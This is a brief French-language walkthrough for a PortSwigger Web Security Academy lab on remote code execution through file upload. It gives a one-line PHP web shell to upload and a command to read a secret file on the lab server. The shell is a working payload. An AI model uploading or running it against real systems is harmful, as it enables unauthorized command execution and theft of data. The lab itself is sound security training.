# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

## Solution

Uploader un shell php simple :

```php
<?php system($_GET['cmd']); ?>
```

Et executer `cat /home/carlos/secret` puis submit la solution.